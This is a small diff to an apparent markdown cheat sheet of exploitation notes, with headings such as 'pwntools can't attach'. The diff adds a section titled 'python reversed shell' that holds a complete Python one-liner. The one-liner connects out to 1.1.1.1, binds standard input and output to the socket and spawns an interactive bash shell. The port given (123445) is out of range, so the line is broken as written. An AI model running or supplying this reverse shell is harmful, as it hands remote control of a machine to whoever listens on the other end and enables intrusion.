@@ -10,7 +10,8 @@ Updating
 
 ## Start
 
-
+## python reversed shell
+`python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.1.1.1',123445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"`
 
 ## pwntools can't attach
 
